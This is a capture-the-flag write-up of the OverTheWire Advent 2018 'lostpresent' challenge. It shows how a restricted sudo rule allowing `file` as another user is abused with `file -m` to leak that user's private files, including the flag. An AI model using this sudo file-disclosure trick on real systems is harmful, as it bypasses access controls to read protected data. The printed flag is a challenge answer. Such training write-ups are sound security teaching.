---
layout:     post
title:      "OverTheWire Advent - lostpresent"
date:       2019-01-05 0:00:00
author:     "W3ndige"
permalink: /:title/
category: 'OverTheWire Advent 2018'
---

Today we have another challenge, into which we have to `ssh` and get the flag from `santa`. 

```text
Clearly, Santa's elves need some more security training. As a precaution, Santa has limited their sudo access. But is it enough?
```

Let's jump straight into the server.

```text
[w3ndige@main ~]$ ssh -p 1211 shelper@3.81.191.176
shelper@3.81.191.176's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-1029-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

shelper@1211_lostpresent:~$ id
uid=12121(shelper) gid=1000(npole) groups=1000(npole)
shelper@1211_lostpresent:~$ ls -la
total 32
drwxr-xr-x 1 shelper npole 4096 Jan  4 20:13 .
drwxr-xr-x 1 root    root  4096 Dec 16 23:01 ..
-rw-r--r-- 1 shelper npole  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 shelper npole 3771 Apr  4  2018 .bashrc
drwx------ 2 shelper npole 4096 Jan  4 20:13 .cache
-rw-r--r-- 1 shelper npole  807 Apr  4  2018 .profile
drwx------ 2 shelper npole 4096 Dec 16 23:02 .ssh
```

From now we can't see much information about how we're going to exploit the system in order to get a flag. In addition, we can see that that's pretty new system so no kernel vulnerabilities for us.

```text
shelper@1211_lostpresent:~$ uname -a
Linux 1211_lostpresent 4.15.0-1029-aws #30-Ubuntu SMP Wed Nov 21 23:58:13 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

But the most important information comes behind `sudo -l` command, from which we learn that we can execute some commands as `santa` user. 

```
shelper@1211_lostpresent:~$ sudo -l
Matching Defaults entries for shelper on 1211_lostpresent:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User shelper may run the following commands on 1211_lostpresent:
    (santa) NOPASSWD: /bin/df *, /bin/fuser *, /usr/bin/file *,
        /usr/bin/crontab -l, /bin/cat /home/santa/naugtylist
```

Through them are commands like `df`, `fuser`, `file`, `crontab -l` or `cat home/santa/naugtylist`. 

```
shelper@1211_lostpresent:~$ sudo -u santa /bin/cat /home/santa/naugtylist
                                              zeeedd$$bc
                                            $ " ^""7$$$6$b
                                          .@"  ..     '$$$$       u
                                         :dz@$*-rC"e    $$$   eE" ^$$ d$  .e$$
                                          $*     F@-$L   $$$..$$7. $"d$Lz@$$*
           ...                           z$$$.  $$RJ 3  $$$$$$$"$$"x$$$$$$F"
           $ ""**$L..                  .P* *  **-  $ 'L 4$$$$"J$$2*$$$N$$$
          dF        ^""**N..          d .$ .@C$  ".@.  #dP" 4J$$  '$$$$$$"
        $b$                ^"#**$..   F  ""  *#"*b.*"   3  .J$$     $$$*
        $$"                        #*$$..               4.$$$$$Nr    "L
       $$$                              "#$             $$$$$$$$d    '$b
      @$$F                               J            u$$$$$$$$$$$N..z@
      $$$L                               $          dr$e$$$$$$$$$$$$$e
      $$$P                               P          *$$$$$$$$$$$$P"$
      $$$"                              4"           $$$$$$$$$$$$
      $$F                               $$          $J$$$$$$$$$$
       $                                $F x   :#.d$$$$$$$$$$$$
      $%                                $d$b:$c4$.$$$$$$$$$$$$"
      $                                $$L.$@$$d$$$$$$$$$$$$$F
     :F                                $ ""$$$$$$$$$$$$$$$$$$
     $                                :F$$$L $$$$$$$$$$$$$$$F
     $                                $.$$$$J6C$$$$$$$$$$$$$
    JF                                $$$$ F$$$$$$$$$$$$$$$
    $                                J%$P*$.$$$$$$$$$$$C$*
   4F                                $'**$J$$$C$*$$$$$""$
   $                                4F  .@$$$$$$$$L3*c.$
   $                                @   $$$$$$$$$$$$$$br
  $                                 $   z$$$$$$$$$$N$$$$$
  $                                z"  @$$$$$$$$$$$$$$$$$r
 4F                                $% z$$$$$$$$$$$$$$$$$$$
 $                                .$ 4**e " 9$$$$$$$$$$$$$r
:F                                d"          #* 4$$$$d$*$$
$                                 $                   """"$$$b
$$Neu.                           J$e.e       .             ^L$
4$$$$$$$Nee.                     $$$$$$$$e$"e$Cee..ur       3$
 $$$$$$$$$$$$$$ee..             d$$$$$$$$$$$$$$$$bee$$dCr .d$$
 '""$$$$$$$$$$$$$$$$$$$$c.     4$$$$$$$$$$^$$$$$$$$$$$$$    "
        "#*$$$$$$$$$$$$$$$$$$$N@$$$$$$$$$  '$$$$$$$$$$$$
            '"*$$$$$$$$$$$$$$$$$$$$$$$$$"    $$$$$$$$$$F.
                 ^"**$$$$$*EF$$P$$$$$$$$    J*""*#****""F.
                       '"  J$.  "     "$$   3F         #)
                          '$ELr       4$    ** $Lb@$.dL$#
                           d$$$N$$b$$$P        $$$$$$$$r
                             $$$$$$$$$F        $$$$$$$$F
                             $$$$$$$$$         $$$$$$$$F
                             $$$$$$$$$         $$$$$$$$F
                             $$$$$$$$$         d*$e $$$"

Naughty list: 
	b0bb
	likvidera
	martin
	morla
	semchapeu
	Steven
	wasa
```

There's nothing useful in `naugtlylist`. And no hints in crontab. But we have few commands that will accept any input, such as `df`, `fuser` and `file`. Going through manpages and use cases of commands, I've noticed this switch in `file` command. We can specify a magic files that `file` will use.

```text
-m, --magic-file magicfiles
        Specify an alternate list of files and directories containing
        magic.  This can be a single item, or a colon-separated list.
        If a compiled magic file is found alongside a file or directory,
        it will be used instead.
```

Magic files exist so that `file` can tell us what type of file we're actually looking at.

```text
[w3ndige@main ~]$ head /usr/share/file/misc/magic.mgc 
�2�
 =//Brain Vision Data Exchange Marker File, VersionBiosig/Brainvision Marker filebiosig/brainvision =.zFileId=TMSi PortiLab sample log file
Version=Biosig/TMSiLOGbiosig/tmsilog =+}Synergy89(&88)&888&8888=?~CRawDataElement=UCRawDataBufferBiosig/SYNERGYbiosig/synergy =+.Brain Vision V-Amp Data Header File VersionBiosig/Brainvision V-Amp file =&-Brain Vision Data Exchange Header FileBiosig/Brainvision data file =#-----BEGIN OPENSSH PRIVATE KEY-----OpenSSH private key =!CX5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR=#!D-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*EICAR virus test files =!ATES MEDICA SOFT. EEG for WindowsBiosig/ATES MEDICA SOFT. EEG for Windowsbiosig/ates = ����SketchUp ModelSketchUp Modelapplication/vnd.sketchup.skpskp =^SC68 Music-file / (c) (BeN)jamisc68 Atari ST music =#C64 tape image fileT64 tape Imagex
 $Version:0x%x!
 ```

If we can enter our own magic directory - `santa` home folder, it will try to parse all the files from that directory and try to aprse them as magic files. 

```
shelper@1211_lostpresent:~$ sudo -u santa /usr/bin/file -m /home/santa/ 
/home/santa//flag_santas_dirty_secret, 1: Warning: offset `AOTW{SanT4zLiT7L3xm4smag1c}' invalid
/home/santa//naugtylist, 1: Warning: offset `                                              zeeedd$$bc' invalid
/home/santa//naugtylist, 2: Warning: offset `                                            $ " ^""7$$$6$b' invalid
/home/santa//naugtylist, 3: Warning: offset `                                          .@"  ..     '$$$$       u' invalid
/home/santa//naugtylist, 4: Warning: offset `                                         :dz@$*-rC"e    $$$   eE" ^$$ d$  .e$$' invalid
/home/santa//naugtylist, 5: Warning: offset `                                          $*     F@-$L   $$$..$$7. $"d$Lz@$$*' invalid
/home/santa//naugtylist, 6: Warning: offset `           ...                           z$$$.  $$RJ 3  $$$$$$$"$$"x$$$$$$F"' invalid
/home/santa//naugtylist, 7: Warning: offset `           $ ""**$L..                  .P* *  **-  $ 'L 4$$$$"J$$2*$$$N$$$' invalid
/home/santa//naugtylist, 8: Warning: offset `          dF        ^""**N..          d .$ .@C$  ".@.  #dP" 4J$$  '$$$$$$"' invalid
/home/santa//naugtylist, 9: Warning: offset `        $b$                ^"#**$..   F  ""  *#"*b.*"   3  .J$$     $$$*' invalid
/home/santa//naugtylist, 10: Warning: offset `        $$"                        #*$$..               4.$$$$$Nr    "L' invalid
/home/santa//naugtylist, 11: Warning: offset `       $$$                              "#$             $$$$$$$$d    '$b' invalid
/home/santa//naugtylist, 12: Warning: offset `      @$$F                               J            u$$$$$$$$$$$N..z@' invalid
/home/santa//naugtylist, 13: Warning: offset `      $$$L                               $          dr$e$$$$$$$$$$$$$e' invalid
/home/santa//naugtylist, 14: Warning: offset `      $$$P                               P          *$$$$$$$$$$$$P"$' invalid
/home/santa//naugtylist, 15: Warning: offset `      $$$"                              4"           $$$$$$$$$$$$' invalid
/home/santa//naugtylist, 16: Warning: offset `      $$F                               $$          $J$$$$$$$$$$' invalid
/home/santa//naugtylist, 17: Warning: offset `       $                                $F x   :#.d$$$$$$$$$$$$' invalid
/home/santa//naugtylist, 18: Warning: offset `      $%                                $d$b:$c4$.$$$$$$$$$$$$"' invalid
/home/santa//naugtylist, 19: Warning: offset `      $                                $$L.$@$$d$$$$$$$$$$$$$F' invalid
/home/santa//naugtylist, 20: Warning: offset `     :F                                $ ""$$$$$$$$$$$$$$$$$$' invalid
/home/santa//naugtylist, 21: Warning: offset `     $                                :F$$$L $$$$$$$$$$$$$$$F' invalid
/home/santa//naugtylist, 22: Warning: offset `     $                                $.$$$$J6C$$$$$$$$$$$$$' invalid
/home/santa//naugtylist, 23: Warning: offset `    JF                                $$$$ F$$$$$$$$$$$$$$$' invalid
/home/santa//naugtylist, 24: Warning: offset `    $                                J%$P*$.$$$$$$$$$$$C$*' invalid
/home/santa//naugtylist, 25: Warning: type `F                                $'**$J$$$C$*$$$$$""$' invalid
/home/santa//naugtylist, 26: Warning: offset `   $                                4F  .@$$$$$$$$L3*c.$' invalid
/home/santa//naugtylist, 27: Warning: offset `   $                                @   $$$$$$$$$$$$$$br' invalid
/home/santa//naugtylist, 28: Warning: offset `  $                                 $   z$$$$$$$$$$N$$$$$' invalid
/home/santa//naugtylist, 29: Warning: offset `  $                                z"  @$$$$$$$$$$$$$$$$$r' invalid
/home/santa//naugtylist, 30: Warning: type `F                                $% z$$$$$$$$$$$$$$$$$$$' invalid
/home/santa//naugtylist, 31: Warning: offset ` $                                .$ 4**e " 9$$$$$$$$$$$$$r' invalid
/home/santa//naugtylist, 32: Warning: offset `:F                                d"          #* 4$$$$d$*$$' invalid
/home/santa//naugtylist, 33: Warning: offset `$                                 $                   """"$$$b' invalid
/home/santa//naugtylist, 34: Warning: offset `$$Neu.                           J$e.e       .             ^L$' invalid
/home/santa//naugtylist, 35: Warning: type `$$$$$$$Nee.                     $$$$$$$$e$"e$Cee..ur       3$' invalid
/home/santa//naugtylist, 36: Warning: offset ` $$$$$$$$$$$$$$ee..             d$$$$$$$$$$$$$$$$bee$$dCr .d$$' invalid
/home/santa//naugtylist, 37: Warning: offset ` '""$$$$$$$$$$$$$$$$$$$$c.     4$$$$$$$$$$^$$$$$$$$$$$$$    "' invalid
/home/santa//naugtylist, 38: Warning: offset `        "#*$$$$$$$$$$$$$$$$$$$N@$$$$$$$$$  '$$$$$$$$$$$$' invalid
/home/santa//naugtylist, 39: Warning: offset `            '"*$$$$$$$$$$$$$$$$$$$$$$$$$"    $$$$$$$$$$F.' invalid
/home/santa//naugtylist, 40: Warning: offset `                 ^"**$$$$$*EF$$P$$$$$$$$    J*""*#****""F.' invalid
/home/santa//naugtylist, 41: Warning: offset `                       '"  J$.  "     "$$   3F         #)' invalid
/home/santa//naugtylist, 42: Warning: offset `                          '$ELr       4$    ** $Lb@$.dL$#' invalid
/home/santa//naugtylist, 43: Warning: offset `                           d$$$N$$b$$$P        $$$$$$$$r' invalid
/home/santa//naugtylist, 44: Warning: offset `                             $$$$$$$$$F        $$$$$$$$F' invalid
/home/santa//naugtylist, 45: Warning: offset `                             $$$$$$$$$         $$$$$$$$F' invalid
/home/santa//naugtylist, 46: Warning: offset `                             $$$$$$$$$         $$$$$$$$F' invalid
/home/santa//naugtylist, 47: Warning: offset `                             $$$$$$$$$         d*$e $$$"' invalid
/home/santa//naugtylist, 49: Warning: offset `Naughty list: ' invalid
/home/santa//naugtylist, 50: Warning: offset `	b0bb' invalid
/home/santa//naugtylist, 51: Warning: offset `	likvidera' invalid
/home/santa//naugtylist, 52: Warning: offset `	martin' invalid
/home/santa//naugtylist, 53: Warning: offset `	morla' invalid
/home/santa//naugtylist, 54: Warning: offset `	semchapeu' invalid
/home/santa//naugtylist, 55: Warning: offset `	Steven' invalid
/home/santa//naugtylist, 56: Warning: offset `	wasa' invalid
file: could not find any valid magic files!
```

And in the warnings we can see a flag!